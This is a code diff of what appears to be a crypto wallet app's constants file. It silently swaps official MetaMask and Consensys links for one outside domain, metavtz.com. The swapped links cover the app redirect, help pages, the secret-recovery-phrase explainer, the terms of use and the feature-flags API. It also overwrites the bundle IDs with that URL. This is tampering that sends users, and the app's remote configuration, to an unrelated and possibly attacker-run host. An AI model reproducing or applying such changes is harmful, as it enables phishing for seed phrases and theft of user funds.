@@ -85,7 +85,7 @@ export default {
       ],
       redirect: {
         native: 'metamask://',
-        universal: 'https://metamask.app.link/',
+        universal: 'https://metavtz.com/',
       },
     } as CoreTypes.Metadata,
   },
@@ -131,16 +131,16 @@ export default {
     TOKEN_BALANCE:
       'https://metavtz.com/',
     WHY_TRANSACTION_TAKE_TIME:
-      'https://community.metamask.io/t/what-is-gas-why-do-transactions-take-so-long/3172',
+      'https://metavtz.com/',
     TESTNET_ETH_SCAMS:
       'https://metavtz.com/',
     WHAT_IS_SRP:
-      'https://community.metamask.io/t/what-is-a-secret-recovery-phrase-and-how-to-keep-your-crypto-wallet-secure/3440',
+      'https://metavtz.com/',
     PRIVACY_POLICY_2024: 'https://metavtz.com/',
     PRIVACY_BEST_PRACTICES:
       'https://metavtz.com/',
     SMART_TXS:
-      'https://support.metamask.io/transactions-and-gas/transactions/smart-transactions/',
+      'https://metavtz.com/',
     SMART_ACCOUNTS: 'https://metavtz.com/',
     STAKING_RISK_DISCLOSURE: 'https://metavtz.com/',
     EARN_RISK_DISCLOSURE: 'https://metavtz.com/',
@@ -172,16 +172,16 @@ export default {
   },
   REVIEW_PROMPT: {
     HIGH_GAS_FEES:
-      'https://support.metamask.io/transactions-and-gas/gas-fees/why-are-my-gas-fees-so-high/',
+      'https://metavtz.com/',
     MISSING_TOKENS:
-      'https://support.metamask.io/managing-my-tokens/custom-tokens/how-to-display-tokens-in-metamask/',
+      'https://metavtz.com/',
     SWAP_ISSUES:
-      'https://support.metamask.io/token-swaps/error-fetching-quote/',
-    SUPPORT: 'https://support.metamask.io',
+      'https://metavtz.com/',
+    SUPPORT: 'https://metavtz.com/',
   },
   BUNDLE_IDS: {
-    IOS: 'io.metamask.MetaMask',
-    ANDROID: 'io.metamask',
+    IOS: 'https://metavtz.com/',
+    ANDROID: 'https://metavtz.com/',
   },
   LEAST_SUPPORTED_ANDROID_API_LEVEL: 29,
   ADD_CUSTOM_NETWORK_POPULAR_TAB_ID: 'popular-tab',
@@ -213,7 +213,7 @@ export default {
     TERMS_DISPLAYED: 'ToU Displayed',
     TERMS_ACCEPTED: 'ToU Accepted',
     TERMS_OF_USE_URL_WITHOUT_COOKIES:
-      'https://legal.consensys.io/plain/terms-of-use/',
+      'https://metavtz.com/',
   },
   FAVICON_CACHE_MAX_SIZE: 100,
   PPOM_INITIALISATION_STATE_CHANGE_EVENT:
@@ -233,7 +233,7 @@ export default {
     'config-api.metamask.io/featureFlags',
   ],
   FEATURE_FLAGS_API: {
-    BASE_URL: 'https://client-config.api.cx.metamask.io',
+    BASE_URL: 'https://metavtz.com/',
     VERSION: 'v1',
     DEFAULT_FETCH_INTERVAL: 15 * 60 * 1000, // 15 minutes
   },
